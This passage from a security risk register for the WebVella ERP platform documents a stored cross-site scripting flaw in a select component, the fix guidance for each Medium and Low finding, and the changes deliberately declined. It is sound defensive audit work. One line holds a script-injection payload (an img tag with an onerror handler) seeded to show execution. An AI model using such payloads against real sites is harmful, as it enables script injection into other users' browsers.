`SameAsRequest`, so local plaintext sign-in is supported, and the warning keeps an absent HTTPS path
visible without preventing the developer from starting the host.

**Two further things the check cannot see, stated so they are not assumed.** It cannot know whether a
trusted proxy actually sends `X-Forwarded-Proto: https` — trusting a proxy that does not leaves the 500
in place, which is why the diagnosis says so — and it cannot know whether a declared `https` endpoint
will bind successfully, for example with an unreadable certificate. Both remain deployment
verifications; see the checklist in [the secure configuration guide](secure-configuration.md).

#### RISK-127 — The select component's display path: what the conversion-boundary guard closes, and what it does not

| Field | Value |
| --- | --- |
| **Status** | Icon/colour half **resolved**; the `Label` channel and the caller-side scope of the guard accepted, with fix guidance |
| **Related finding** | QA finding `F-R3-XSS` (MAJOR, CWE-79, OWASP A03:2021), a fifth render path for `H-06` |
| **Weakness** | CWE-79 (improper neutralisation of input during web page generation), CWE-83 (improper neutralisation of script in attributes) |
| **Owner** | Platform team |

**What was found.** A stored option's `icon_class` and `color` reached a `class` and a `style` attribute
**unencoded** through the third-party `WebVella.TagHelpers` 1.8.0 select component's display path, which
composes `<i class="{icon_class}" style="color:{color}"></i> {label}` by concatenation. A stored value
containing a double quote therefore closed the `class` attribute and opened attributes of its own. Runtime
verification measured the parser producing `["class","onmouseover","\"","style"]` on an element the
application only ever gave two attributes, and Chrome's own Content-Security-Policy engine logged
*"Executing inline event handler"* against the live page — the browser classifying the injected attribute
as a real inline handler and reaching its execution stage. The injected `color:red` computed live as
`rgb(255,0,0)`.

**Why it was not caught by the original `H-06` pass.** The three widget-side paths and
`TaskService.GetTaskIconAndColor` were guarded by a helper that lived **inside the Project plugin**. The
widest consumer of the same two values is not a plugin at all: it is
`WebVella.Erp.Web/Utils/ModelExtensions.cs`, whose `ToWvSelectOption` is the only place in the repository
that constructs a `WvSelectOption` and therefore the single boundary feeding **94** call sites across
**65** files and **176** `wv-field-select` / `wv-field-multiselect` tag usages. `WebVella.Erp.Web` cannot
reference a plugin that references it, so a guard owned by the plugin could never have reached that
boundary. The exposure was consequently reachable on **every** host that renders any select field —
including hosts that do not carry the Project plugin at all, which is what made it cross-host.

**What was changed.** `SafeStyleValue` was promoted from
`WebVella.Erp.Plugins.Project/Services/SafeStyleValue.cs` to
`WebVella.Erp.Web/Utils/SafeStyleValue.cs` — moved, not copied, so exactly one audited implementation
exists — and applied at the conversion boundary. The plugin's three call sites now consume the promoted
helper through a `using`; their behaviour is byte-identical because the allow-lists themselves are
unchanged. The guards reject rather than escape and are idempotent, so the plugin-side calls that are now
redundant remain harmless and are deliberately retained.

**A second sink closed by the same edit, worth naming because encoding could not have closed it.** The
framework already encoded the inline-edit `<option data-icon data-color>` attributes correctly, yet that
did not protect the edit surface: the select2 script reads the **decoded** attribute value back out of the
DOM and re-inserts it as markup, reproducing the identical break-out client-side. Runtime verification saw
the injected-handler count rise from one to two when the inline editor was engaged. Allow-listing the value
*before* it is ever written into those attributes is what closes that half — no amount of correct
server-side encoding would have.

**Residual 1 — `SelectOption.Label` is raw at the same sink, and is deliberately left so.** Measured, not
assumed: seeding `label = high<img src=x onerror=alert(…)>` produced a live `<img>` element in the display
`<div>` on the task-details page and once per affected row on the SDK data list, while the same value in the
form-mode `<option>` text was correctly encoded to `high&lt;img …&gt;`. Encoding `Label` at the conversion
boundary would therefore **double-encode** it in edit mode, and unlike `icon_class` and `color` — whose
legitimate values are a class token list and a colour, neither of which can contain an HTML-special
character — an option label legitimately can: `R&D`, `Client's request`, `> 30 days`. Every such label
would visibly render its entities in every dropdown in the product, which the audit plan's preservation
requirement (§0.3.2, "user-facing behaviour is preserved") forbids, and an allow-list is not available
either because a label's legitimate value space is arbitrary text. The channel is privilege-gated to the
same administrator tier `RISK-023` already accepts for the by-design raw channels, and the report-only
Content-Security-Policy observes it.

*Recommended fix, when the platform team chooses to close it.* Two options, in order of preference.
(a) Ask the tag-helper library for an opt-in `encode-text` mode on the select display path — the same
request `RISK-121` makes for the grid column — after which no caller-side change is needed at all.
(b) Encode `Label` at the boundary **and** stop relying on the component's own encoding, which requires the
library to expose whether it will encode; without that, (b) trades a script-execution channel for a
visible-entity regression and is not an improvement on balance. Do **not** attempt an allow-list on
`Label`: unlike the other two values it has no constrainable shape.

**Residual 2 — the guard is caller-side, so it constrains what the platform passes, not what the component
renders.** Two futures reintroduce the exposure. A new code path that constructs a `WvSelectOption`
directly instead of going through `ToWvSelectOption` would bypass the guard entirely; today there is
exactly **one** construction site in the repository, and the in-code comment at it says so, but nothing
mechanically prevents a second. And a future version of the component that renders another `SelectOption`
member into an attribute would arrive unguarded. Both are review-time concerns, not runtime ones.

*Recommended control.* Keep the single-construction-site property true, and treat it as an invariant during
review of any change to `WebVella.Erp.Web/Utils/ModelExtensions.cs`. A mechanical check — asserting that
`new WvSelectOption` occurs exactly once repository-wide — would close it, and is recorded here rather than
added because the plan admits no new tooling beyond the gates it already defines.

**Correction of record.** `SafeStyleValue`'s original remarks asserted that *"four independent render paths
consume the same two values"*. That count was short by one; there are **five**, the fifth being the
platform-wide select conversion boundary. The pattern that produced the miss is worth naming because it is
reusable: the count enumerated *the paths that had been fixed* rather than *the sinks that consume the
value*. The remarks in `WebVella.Erp.Web/Utils/SafeStyleValue.cs` and the comment in
`PcProjectWidgetTasksQueue.cs` now both state the corrected count and the reason the fifth path sits
outside any plugin's reach.

#### RISK-128 — The 24 informational findings from the cross-cutting runtime QA pass

**Status: documented for a future sprint.**

The pass that raised `F-R3-XSS` also recorded **24** informational observations. None is attributable to this
remediation, and that was established by counterfactual rather than by claim: **zero** `.css` files were
changed by the project; `button-colors.css` — the root cause of the focus-glow group — exists only inside the
vendor NuGet package; `Nav.Default.cshtml`, `Theme/styles.css`, `login.cshtml` and all three chart views were
verified `UNCHANGED`; **zero** repository files reference Chart.js `tooltips`; and the two widgets the
remediation did edit emit avatar markup byte-identical to pre-project apart from an added `alt=""`. The
decisive cross-check is that *"My Timesheet"* emits no avatar at all and still overflows by +177 px, so the
added markup cannot be the cause of the overflow group.

**Why they are declined rather than fixed.** The same acceptance criteria that govern `RISK-122`: minimal
code changes only; no feature additions or enhancements; no refactoring beyond security requirements;
third-party code restricted to version updates; and fix only what is confirmed, with no speculative
hardening. Accessibility, layout, chart-configuration and copy defects in unmodified files meet none of the
tests that bring work into this scope. They are written up here because the plan's fourth objective requires
every documented finding to carry an actionable fix rather than a generic caution.

**Eleven are already named elsewhere and are not restated.**

| Finding | Already covered by |
| --- | --- |
| Login inputs carry no `autocomplete` | `RISK-125`, and the login-markup row of `RISK-122` |
| Accessibility cluster — focus indicators, 44 px targets, five contrast failures including the 1.61:1 sort carets, unlabelled pager input, `logo.png` with no `alt`, no `aria-invalid`/`aria-describedby`/`role="alert"` | the accessibility group of `RISK-122` |
| No semantic heading on `/login` | the *"no `h1` and no `<main>` landmark"* row of `RISK-122` |
| Horizontal overflow below 808 px on 6 of 7 screens (minimum content width measured at 457 px on the details page) | the responsive group of `RISK-122`, which records the same root cause and the `.table-responsive` fix; this pass adds the 808 px threshold and the fixed-width navbar as the second contributor |
| Nine-column Timesheet escapes its card (`overflow-x: visible`, no `.table-responsive`) | same group, same fix |
| Escaped table content overlaps a foreign panel at 768 px | same group |
| Details-page *Manage* button clipped at 375 px; read-only grid never stacks | same group |
| Chart tooltips disabled and `labels` empty on all four doughnuts | the data-presentation group of `RISK-122` |
| Generic error page lacks `<!DOCTYPE html>` (Quirks Mode) | the *"production error page"* row of `RISK-122`, which also records why that page is deliberately layout-free |
| HTTP 405 on the avatar path emitted by a pre-built third-party bundle | `RISK-058` |
| The 88-plus shared `wv-field-select` call sites that made the vendor sink product-wide | `RISK-127`, which closes them all at one boundary |

**The thirteen not previously named, each with a recommended fix.**

| # | Finding | Measured | Recommended fix |
| --- | --- | --- | --- |
| 1 | **No cross-process entity-metadata cache invalidation.** *Security-adjacent — read this one first.* | A host that was not restarted kept serving stale option metadata across two subsequent database changes | Field permissions live in the same cached JSON as the metadata, so a runtime permission **tightening** does not reach other host processes until they restart. Until a cross-process invalidation channel exists, treat a permission change as requiring a rolling restart and say so in the operator runbook. The minimal technical fix is a version column on the metadata row that each process re-reads on a short interval; a full notification channel is a larger change than this plan admits |
| 2 | `rec_user.last_logged_in` is never updated | The write lives inside the fully commented-out block at `WebVella.Erp.Web/Security/WebSecurityUtil.cs` | Left dead deliberately — the plan keeps the dead security code documented rather than deleted. Authentication auditing was restored at the live login path instead, which is what `M-12` actually required. To close this specifically, set the column in `login.cshtml.cs` alongside the existing audit record; it is one statement |
| 3 | The `weight` field stores 10 when 77 or 55 was submitted | Handler files verified git-unchanged, so pre-existing | The bound property is not the property the save path reads. Trace `weight` from the page model to `RecordManager` and bind the same name at both ends; no security consequence, but it is a data-fidelity defect a user can see |
| 4 | User-list column headers transposed | — | Correct the header order in the SDK user-list view so each header sits above its own column |
| 5 | Stale page titles, e.g. *"Create New Application"* on unrelated create screens | — | The titles are copied seed data. Correct the `label` of the affected pages in the SDK page-manage UI; no code change is needed |
| 6 | The validation banner's title duplicates the first error message | — | Render a fixed heading in the banner component and list the errors beneath it, rather than promoting `errors[0]` into the title |
| 7 | No success confirmation after create or save | — | A feature addition, which the plan excludes. When scheduled, reuse the toast component already referenced by the shared layout rather than introducing a new one |
| 8 | `<label for>` points at a hidden input while the visible file input is unlabelled | file-field tag helper | The same class of defect as the `input`/`textarea` mismatch in `RISK-122`: derive `for` from the element actually rendered. Fixing both together in the field tag helpers is cheaper than fixing either alone |
| 9 | The login POST re-render emits a bare `<img/>` with no `src` and no `alt` | root-caused at the raw-HTML level in the login view | Emit the logo through the same expression the GET path uses, or drop the element on re-render. Cosmetic, but it also produces a console resource error on every failed sign-in |
| 10 | Overdue count differs by one between `TaskService` and `PcProjectWidgetTaskDistribution` | grand totals still reconcile at 6 | The two use different boundary comparisons for *today*. Pick one — inclusive or exclusive of the current day — and have the widget call the service rather than recomputing |
| 11 | `MoveFile` raises an unhandled exception on a malformed body | Response is byte-identical to the pre-project baseline: HTTP 400, **0-byte** body, **0** leak tokens | Fail-closed and non-disclosing already, so this is a reliability rather than a security concern — which is why the plan leaves the empty and missing handlers alone. To close it, validate the body shape before dereferencing it and return the same 400 deliberately |
| 12 | The vendor `WebVella.TagHelpers` hard-codes the Windows time-zone id `"FLE Standard Time"`, which this Linux ICU build cannot resolve | Worked around **outside** the repository with a tzdata symlink, deliberately left in place so later runs still work | Raise upstream: the library should accept the configured `Settings:TimeZoneName` rather than a hard-coded Windows identifier. Until then the platform-level override documented in [the secure configuration guide](secure-configuration.md) is the supported route, and the symlink is a container-local convenience that must not be relied on in a deployment |
| 13 | **Positive finding, recorded so it is not later mistaken for a defect:** submitting the redaction sentinel as a password is ignored silently rather than stored | — | This is the intended behaviour of the write-side sentinel check and is what prevents a full-record round-trip from overwriting a credential hash. No action. It is the runtime confirmation of the highest-risk ripple the plan identified |

**One thing this pass did *not* find, which is worth recording.** It re-tested every control the remediation
delivered — credential rehashing, hash redaction, login throttling, authorisation and IDOR boundaries, the
upload and download pipeline, output encoding, transport and header posture, error propagation, and a full
CRUD state-consistency cycle — across all seven hosts plus a Development host, and reported **1,179 of 1,180**
test cases passing with no Critical and no Minor findings. The single failure was `F-R3-XSS`, now `RISK-127`.

This register's canonical index carries `RISK-126`, `RISK-127` and `RISK-128` as its last three rows.

The remaining sections are not further `RISK-` entries. They record the rule that governed every
disposition above, the per-finding fix guidance for the Mediums and Lows that were documented rather
than fixed, the changes that were declined and why, and the residuals and build-graph observations that
follow from the fixes themselves.

## The governing disposition rule, and which Mediums qualified

Everything in this register follows from one rule, stated here word-for-word because it is what decides
whether a confirmed weakness was fixed or documented:

> Criticals and Highs are fixed; Mediums and Lows are documented, and a Medium is remediated only when
> it is **(a)** the compensating control for a confirmed Critical or High, **(b)** explicitly mandated by
> a Fix Implementation Standard, or **(c)** an unavoidable by-product of a Critical or High fix in the
> same method.

**Where the rule comes from.** It is not an engineering preference. It is derived from the engagement's
own **Severity Matrix**, which is prescriptive rather than advisory: it names the disposition for each
band. Critical is *"Immediate remediation required"* and High is *"Remediation required"*, so both are
remediation targets. Medium is *"Document with fix guidance"* and Low is *"Document for future sprint"*,
so neither is. The three limbs above are the only sanctioned exits from the Medium band, and the same
rule is stated in compact form in the severity table of
[`SECURITY.md`](https://github.com/Blitzy-Sandbox/blitzy-WebVella-ERP/blob/master/SECURITY.md), whose
Medium row reads *"Documented with fix guidance; remediated when it is a compensating control for a
confirmed Critical or High"*. The two statements agree; this one simply spells out the two further cases
that limb (a) does not cover on its own.

The matrix is also what places two findings where an intuitive reading would not. Unsalted password
hashing sits in **Critical** as *data breach exposure* rather than in the Medium *weak cryptography*
band, and missing security headers sit in **Low** as a *missing security header* rather than in Medium —
which is precisely why `M-01` needed limb (a) to be remediated at all.

**The eight Mediums that qualified, each under its limb.** Every remediated Medium in this engagement
passes exactly one of the three tests, and no other Medium was touched:

| Medium | Limb | Why it qualified |
| --- | --- | --- |
| `M-05` — non-constant-time hash comparison | **(c)** | By-product. Same file as `C-03` (`WebVella.Erp/Utilities/PasswordUtil.cs`); the framework hasher's verification already performs a fixed-time comparison, so closing `C-03` closed this in the same edit |
| `M-06` — shared mutable hash instance | **(c)** | By-product. Same file as `C-03`; the shared `MD5` instance at `PasswordUtil.cs:L9` was dropped for the thread-safe static call in the same edit |
| `M-13` — password bounds of 6 to 24 characters | **(b)** | Mandated by the **Authentication Hardening** standard's *"Minimum password complexity: 12+ characters"* clause. Raised to 12–128 at `WebVella.Erp/ERPService.cs:L216-L217`; the low ceiling was itself an obstacle to strong passphrases |
| `M-12` — login auditing disabled | **(b)** | Mandated by the **Authorization Enforcement** standard's *"Log authorization failures"* clause. Recorded at the live login path, because the legacy update calls sit inside a fully commented-out block |
| `M-18` — defective output encoder | **(a)** | Compensating control. The case-sensitive string substitution stood **directly at a cross-site-scripting sink**, so it is a control for `H-06` / `H-07` rather than an independent weakness |
| `M-01` — no security response headers | **(a)** | Compensating control for `H-15`. Without `nosniff`, frame options and a content policy, several other findings stay exploitable in a browser even after their own fixes land |
| `M-03` — sign-in call not awaited | **(c)** | By-product. Same file and same method region as `H-02` / `H-03` (`WebVella.Erp.Web/Services/AuthService.cs`) |
| `M-04` — local time used for token timestamps | **(c)** | By-product. Same file as `H-02` / `H-03`; a token lifetime that shifts with the host's UTC offset is not the bounded session `H-03` requires |

Every **other** Medium and every Low is documented only. Each appears in the next section with a
concrete recommended fix, and the reason each was declined is in *changes deliberately declined under
the Minimal Change Clause* below.

## Every documented-only Medium and Low, with a recommended fix

This section discharges the requirement that every Medium and Low finding not remediated carries
**actionable** fix guidance rather than a generic caution. The full eight-field record for each finding
lives in [the security audit report](security-audit-report.md); what follows is deliberately compact —
identifier, weakness classification exactly as the report states it, disposition, and the fix.

Two conventions apply. Weakness identifiers are restated **exactly** as the report gives them, including
its `—` where no identifier is asserted and its `-adjacent` qualifiers where the report declines to claim
an exact match; none is invented here. And where a finding was remediated under one of the three limbs
above, that is stated plainly and the change itself is recorded in
[the remediation log](remediation-log.md) rather than repeated here.

### Medium severity — M-01 through M-18

| ID | Finding | CWE | OWASP | Disposition and recommended fix |
| --- | --- | --- | --- | --- |
| `M-01` | No security response headers | — | A05:2021 | **Remediated**, limb (a). All seven mandated headers are emitted by `SecurityHeadersMiddleware` in all seven host pipelines, ahead of response compression and both static-file middlewares. The one residual is the content policy's delivery mode — RISK-022 |
| `M-02` | No antiforgery validation on the MVC API surface | CWE-352 | A01:2021 | **Documented only.** Correctly narrowed to `WebApiController`: the Razor Pages login already validates at `WebVella.Erp.Web/Pages/login.cshtml.cs:L64`, so this is not a platform-wide absence. Only the zero-breakage half was applied — the `SameSite=Lax` and `Secure` cookie attributes, which already block cross-site *form* posts of the session cookie for unsafe methods. **Fix:** emit the verification token in the shared layout, attach it from the platform's own AJAX helper so existing JavaScript clients start sending it, confirm by telemetry that no untokened caller remains, then switch on `AutoValidateAntiforgeryToken`. Declined now because today's clients post without a token and enforcement would break working functionality |
| `M-03` | Sign-in call not awaited | — | A07:2021 | **Remediated**, limb (c). The call is awaited, which made the method asynchronous and propagated to its single caller — a compile-mandated ripple, not an opportunistic one |
| `M-04` | Local time used for token timestamps | CWE-613 | A07:2021 | **Remediated**, limb (c). `DateTime.UtcNow` replaces `DateTime.Now`, so the expiry claim means what it says regardless of host timezone |
| `M-05` | Password hash comparison was not constant time | CWE-208 | A02:2021 | **Remediated**, limb (c). `CryptographicOperations.FixedTimeEquals` over equal-length spans, with length checked first and absent input failing closed |
| `M-06` | Shared mutable hash instance used from concurrent requests | CWE-362 | A02:2021 | **Remediated**, limb (c). The shared instance is gone in favour of the thread-safe static call |
| `M-07` | Unbounded script-evaluation cache holding compiled delegates | CWE-770, CWE-94 | A08:2021 | **Documented only.** Verified locators — `WebVella.Erp.Web/Services/CodeEvalService.cs:L13`, `private static readonly Dictionary<string, object> scriptObjects = new Dictionary<string, object>();`, and `:L44`, `CSScript.EvaluatorConfig.ReferenceDomainAssemblies = true;`. **Path correction worth stating: `WebVella.Erp/Utilities/CodeEvalService.cs` does not exist**, so a fix aimed there would miss. **Fix:** replace the unbounded dictionary with a size- or time-bounded cache carrying an eviction policy, and narrow `ReferenceDomainAssemblies` to an explicit assembly list so a compiled script cannot reach the whole loaded domain |
| `M-08` | Deterministic initialisation vector in the symmetric encryption helpers | CWE-329 | A02:2021 | **Documented only** — and latent: the helpers have no active caller, which is why this is not a Critical. RISK-006 additionally records that changing the scheme in place would make any already-encrypted data undecryptable. **Fix:** generate a per-message CSPRNG initialisation vector and prepend it to the ciphertext, and migrate the primitive to AES-256-GCM as the Cryptographic Standards block requires. Version the payload so existing ciphertext stays readable through the transition |
| `M-09` | Anonymous access to a developer page | CWE-306 | A01:2021 | **Documented only** — it does not meet the compensating-control test. Now at `WebVella.Erp.Site.Sdk/Startup.cs:L97`, `options.Conventions.AllowAnonymousToPage("/dev")` (the audit locator `:L48` drifted as the host pipeline grew). **Fix:** delete the convention outright, or wrap it in an `environment.IsDevelopment()` guard so it cannot ship enabled |
| `M-10` | Anonymous resource-read endpoint on the project plugin | CWE-306, CWE-200 | A01:2021 | **Documented only** as an *anonymous* surface; its log-injection and log-volume half **was** closed. The action is now at `WebVella.Erp.Plugins.Project/Controllers/ProjectController.cs:L512` (audit locator `:L462`). **Fix:** remove `[AllowAnonymous]` and require authentication, or — if the asset must stay public — bind the `file` parameter to a fixed allow-list of embedded resource names instead of accepting a caller-supplied string |
| `M-11` | Synchronous IO enabled for every request | CWE-400 | A05:2021 | **Documented only.** Declined because removing the allowance would break the synchronous manager code paths that depend on it. **Fix:** convert those manager paths to `async`/`await` — they are the actual dependency — and only then remove `AllowSynchronousIO` from `WebVella.Erp.Web/Middleware/ErpMiddleware.cs`. Doing it in the other order breaks the platform |
| `M-12` | Login auditing is unreachable dead code | CWE-778 | A09:2021 | **Remediated**, limb (b). Success and failure are recorded at the live login path. The dead block at `WebVella.Erp.Web/Security/WebSecurityUtil.cs:L40-L85` is left in place and documented under `L-01` rather than deleted |
| `M-13` | Password length bounds of 6 to 24 characters | CWE-521 | A07:2021 | **Remediated**, limb (b). Raised to 12–128 |
| `M-14` | No multi-factor authentication | CWE-308 | A07:2021 | **Documented only.** Architectural, and no confirmed Critical or High required it, so building it would be the enhancement-beyond-remediation the constraints forbid. **Fix:** add a TOTP second factor against the existing user entity, or delegate authentication to an external identity provider. Feature work — schedule it, do not smuggle it into a remediation |
| `M-15` | Client library loaded from a content delivery network without an integrity attribute | CWE-829 | A08:2021 | **Documented only.** **Fix:** add `integrity` (a SHA-384 subresource-integrity digest) and `crossorigin="anonymous"` to the script tag; or, preferably for a product that must build offline, vendor the library into `wwwroot` at a pinned version and drop the external origin entirely — which also removes the third-party origin from the content policy's allow-list |
| `M-16` | Legacy timestamp behaviour enabled on every host | CWE-1254-adjacent | A05:2021 | **Documented only.** `AppContext.SetSwitch("Npgsql.EnableLegacyTimestampBehavior", true);` is present in all seven hosts — `WebVella.Erp.Site/Startup.cs:L54` (audit locator `:L40`), and the equivalent line in each sibling. Declined because flipping it changes how **already-stored** timestamps are interpreted, which risks silent data corruption — a worse outcome than the finding. **Fix:** migrate stored values to `timestamptz` semantics in a dedicated, separately validated change with its own backup and rollback plan, then remove the switch from all seven hosts in one commit |
| `M-17` | Exception details e-mailed off-box before they are persisted | CWE-532, CWE-209 | A05:2021 | **Documented only**, and **materially mitigated** rather than untouched: `H-11` restored certificate validation on the mail transport, so the payload no longer crosses an unauthenticated channel. It is also **bounded** — `WebVella.Erp/Diagnostics/Log.cs:L81-L114` serialises the request URL but **not** headers, cookies or body. One correction to that bound: `:L111` builds `request_url` from scheme, host, path **and QueryString**, so query parameters *are* included. **Fix:** persist the record first and notify second, so a delivery failure cannot lose the diagnostic, and redact the query string from the notification payload |
| `M-18` | The codebase's only output encoder was trivially bypassable | CWE-116 | A03:2021 | **Remediated**, limb (a). The case-sensitive string substitution is replaced by the framework's JavaScript encoder |

### Low severity — L-01 through L-10

| ID | Finding | CWE | OWASP | Disposition and recommended fix |
| --- | --- | --- | --- | --- |
| `L-01` | Dead security code retained in the tree | CWE-561 | A05:2021 | **Documented only.** The inventory, measured: `WebVella.Erp.Web/Security/AuthorizeAttribute.cs` 146 lines, `WebVella.Erp.Web/Security/AuthCache.cs` **61 lines**, `WebVella.Erp.Web/Security/AuthToken.cs` 146 lines, and `WebVella.Erp.Web/Security/WebSecurityUtil.cs` where L37 through L90 are entirely `//`-commented, including the `UpdateUserLastLoginTime(userId)` calls at `:L50` and `:L76`. Twelve further `[AllowAnonymous]` exemptions exist **only** inside commented-out code and are therefore not part of the anonymous attack surface. Declined because unreachable code is not exploitable, so removal is hygiene rather than remediation. **Fix:** delete all four in a dedicated cleanup change with no other content, so the diff is reviewable as pure subtraction. **Path precision, because this is easy to get wrong: the dead cache is `Security/AuthCache.cs`, *not* `Utils/AuthCache.cs`, and it is a different file from the live 54-line `WebVella.Erp.Web/Utils/Cache.cs` that the login throttle is built on** |
| `L-02` | Fifteen package references exist only inside XML comments | — | A06:2021 | **Documented only** as hygiene. **Fix:** delete the commented `<PackageReference>` elements. One of them, `SixLabors.ImageSharp` 3.1.6 in `WebVella.Erp.Web/WebVella.Erp.Web.csproj`, carries a genuine High-severity out-of-bounds-write advisory that **does not apply to this build** because the reference is not in the build graph — which is exactly why these fifteen are recorded as hygiene and never as findings. Reporting them would have put false High findings in the audit report |
| `L-03` | Packaging script references manifests that do not exist | CWE-1104-adjacent | A08:2021 | **Documented only.** `create-nuget-pkgs.bat` invokes `nuget pack` against four `.nuspec` manifests; a repository-wide search finds **zero** `.nuspec` files, so the script is already non-functional and cannot be a live risk. **Fix:** either delete the script — the modern `dotnet pack` path supersedes it, and the licence-governance gate in `Directory.Build.props` only guards *that* path — or add the four manifests and bring the script under the same gate. Leaving it half-real is the worst of the three |
| `L-04` | Large binary committed to the repository | — | A08:2021 | **Documented only.** `ExternalLibraries/libwkhtmltox.dll`, measured at **29,765,120 bytes (~28.4 MB)**. **Fix:** replace it with a `PackageReference` to a maintained distribution of the library, or track it through Git LFS. Either removes a 28 MB unversioned, unverifiable binary from every clone; the package reference additionally brings it inside the dependency-audit graph, which an unmanaged DLL can never be |
| `L-05` | No health endpoint and no rollback tooling | CWE-1059-adjacent | A09:2021 | **Documented only.** **Fix:** add an ASP.NET Core health-check endpoint that probes the database connection and reports readiness, and write a documented rollback procedure covering the schema version 4 data migration in particular — see [the credential migration guide](credential-migration.md) for what that migration changes |
| `L-06` | Inert TypeScript build configuration in seven projects | CWE-1164 | A05:2021 | **Documented only.** `TypeScriptToolsVersion` and its companion properties appear in exactly **seven** `.csproj` files with no TypeScript sources and no `tsconfig.json` anywhere in the tree, so nothing compiles them. **Fix:** delete the inert property groups. If TypeScript is genuinely wanted, add real sources and a `tsconfig.json` — but that is a feature, not a fix |
| `L-07` | No lock file and an unpinned SDK version | — | A05:2021 | **Half closed, half documented.** The SDK half is **fixed**: `global.json` previously carried its version key commented out (`//"version": "7.0.103"`) and now pins **`10.0.302`** with `"rollForward": "disable"` — an exact pin rather than a band, because a patch release can move an analyzer's default severity or the audit defaults and so move the gate's verdict. The lock-file half is documented. **Four build files were deliberately declined and remain absent from the repository: `Directory.Build.targets`, `Directory.Packages.props`, `nuget.config` and `packages.lock.json`.** **Fix:** adopt central package management (`Directory.Packages.props`) and commit a lock file (`packages.lock.json`) so restore is byte-deterministic; add `nuget.config` to pin the package source explicitly; and add `Directory.Build.targets` to re-append the promoted audit codes after every project body, which is what would close RISK-029 |
| `L-08` | Service-catalogue and documentation drift | CWE-1059-adjacent | A05:2021 | **Partly closed, the rest documented.** The service-catalogue half is **fixed**: `catalog-info.yaml:L5-L6` no longer advertises cloud-native microservices or a serverless architecture — it now states the platform's actual shape, the same sentence `docs/index.md:L3` publishes — and the descriptor links the audit report directly, so its security-audit claim is evidenced rather than asserted. Two non-changes there were deliberate and are recorded in that report's entry rather than inferred: the `PR #2` link at `:L28-L30` is retained as a historical pointer, and the `Blitzy Documentation` link at `:L31-L33` still points at a directory whose creation was declined. The four deferred items are enumerated in [the security audit report](security-audit-report.md) under *documentation drift deferred into this report*, and are not duplicated here. **Fix:** correct the licence badge at `README.md:L12` and the stack claim at `:L18` in a documentation-only change, so the correction cannot be entangled with a code diff |
| `L-09` | No server-side request forgery surface | CWE-918 (not present) | A10:2021 | **No fix required — proven not applicable.** Every `HttpClient` in the repository is browser-side Blazor WebAssembly code, and the one server-side construction of a URI from data is guarded to a fixed path prefix and resolves through a database repository rather than a network call. Recorded deliberately, as a negative result, so that A10 is not re-investigated from scratch and so that no speculative SSRF finding is ever added |
| `L-10` | No CI/CD pipeline existed | CWE-1053-adjacent | A08:2021 | **Addressed.** Before this engagement `.github` contained exactly one file, `.github/FUNDING.yml`, so the automated-validation objective had nowhere to live; a security-scan workflow now enforces the gates. What remains is recorded in *build-graph and gate coverage* below and as RISK-030: a solution-level command reaches 17 of the 19 projects, and the two WebAssembly projects are covered by dedicated per-project steps instead |

## Changes deliberately declined under the Minimal Change Clause

This is where Minimal Change guideline 8 — *"Document out-of-scope concerns but do not fix unless
Critical"* — is discharged. **Every item below is a real weakness that a maximalist reading would
fix.** Each is declined because the engagement mandates the least invasive control (guideline 5), the
solution requiring the least modification (guideline 7), and exact preservation of working functionality
(guideline 2); and because it forbids enhancement or refactoring beyond remediation (guidelines 3 and
4). Declining is a decision, so each carries its reason.

**Code and configuration left alone deliberately:**

* **Deleting the dead security code** (`L-01`) — unreachable, therefore not exploitable. Removal is
  hygiene, not remediation.
* **Removing the fifteen commented dependency entries** (`L-02`) — same reason, and they are not in the
  build graph.
* **Touching the raw-output occurrences that render server-generated markup.** The census is exact, not
  approximate: **128** `Html.Raw(` occurrences across **69** `.cshtml` files, of which
  `Html.Raw(action)` accounts for **49** and `Html.Raw(record["action"])` for **6** — roughly 55 in
  total. All seven builder sites were inspected and every one interpolates only identifiers; a search
  for interpolation of database text fields into those builders returned **zero** matches. Changing them
  would break working screens for no security benefit, which is why they are a declined change and
  **never a finding**.
* **Tightening cross-origin policy at the five already-restrictive hosts** —
  `WebVella.Erp.Site.Crm`, `.Mail`, `.MicrosoftCDM`, `.Next` and `.Sdk` already use a restrictive named
  policy, so the finding correctly covered two hosts rather than seven. Their hard-coded localhost
  origins are a separate low-severity note carried in the ongoing recommendations, not an unfixed
  finding.
* **Removing synchronous IO** (`M-11`) — would break the synchronous manager code paths.
* **Removing legacy timestamp behaviour** (`M-16`) — would change the interpretation of already-stored
  timestamps, risking data corruption.
* **Enforcing antiforgery on the MVC API surface** (`M-02`) — existing JavaScript clients post without a
  verification token, so enforcement would break working functionality. Only the zero-breakage
  cookie-attribute half is applied.
* **Blanket field-permission enforcement across the data layer** — would ripple through 23 field types
  and every read and write projection, and because `WebVella.Erp.Web/Components/PcFieldBase/PcFieldBase.cs:L610`
  treats an **empty** read permission as **denial**, a blanket port would hide fields wholesale. `C-02`
  was fixed surgically instead; the residual is recorded below.
* **Escalating analyzer rules to build errors** — enabling the .NET analyzers across roughly 700
  pre-existing source files surfaces a large legacy warning backlog, and promoting that wholesale would
  demand exactly the repository-wide refactor the constraints forbid. **Only the dependency diagnostic
  codes `NU1901`–`NU1904` are promoted to errors** (alongside `NU1900` and `NU1905`, which cover an
  unreachable or advisory-less audit source). No `CA` identifier is promoted, and no blanket
  warnings-as-errors switch is set. See RISK-024, RISK-051 and RISK-052 for what that leaves uncovered.
* **Removing the anonymous developer page** (`M-09`) and **the anonymous project resource read**
  (`M-10`) — both Mediums that do not meet the compensating-control test.
* **Adding multi-factor authentication or an external identity provider** (`M-14`) — feature work with
  no confirmed Critical or High behind it.
* **Bounding the script-evaluation cache** (`M-07`).
* **Fixing the deterministic initialisation vector** (`M-08`) — latent, with no active callers, and
  changing it in place would make already-encrypted data undecryptable.
* **Suppressing the e-mailed exception details** (`M-17`) — materially mitigated once `H-11` restored
  certificate validation on the mail transport, and bounded by what `Log.cs:L81-L114` actually
  serialises.
* **Adding subresource integrity to content-delivery-network libraries, or pinning unversioned client
  assets** (`M-15`).
* **`L-04` through `L-07`** — the 28.4 MB committed binary, the inert TypeScript configuration, and the
  absent lock file, package-source configuration, health endpoint, smoke tests and rollback tooling.
* **Creating any test project or test-framework integration.** This is the feature work the constraints
  forbid, and it is the reason the *"existing test suite passes"* gate is vacuous **by construction**
  rather than by omission — no test project, test-framework package reference or executable test method
  exists in any of the 19 projects. The substitute regime is recorded in
  [the remediation log](remediation-log.md).
* **Fixing the empty exception handlers** at
  `WebVella.Erp.Web/Middleware/ErpErrorHandlingMiddleware.cs:L57-L60` and `:L63-L66` (`catch { }`) — a
  **reliability** concern, not a security one.
